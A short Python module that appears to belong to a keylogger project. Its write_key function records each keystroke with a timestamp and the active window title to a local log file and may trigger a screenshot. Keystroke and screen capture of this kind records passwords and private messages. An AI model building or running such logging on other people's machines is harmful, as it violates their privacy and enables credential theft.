from datetime import datetime
from tracker import get_active_window
from screenshots.capture import maybe_capture_screen
import os

log_path = "logs/log.txt"

def write_key(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    window = get_active_window()

    entry = f"{timestamp} | {window} | {k}\n"

    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(entry)

    maybe_capture_screen(k)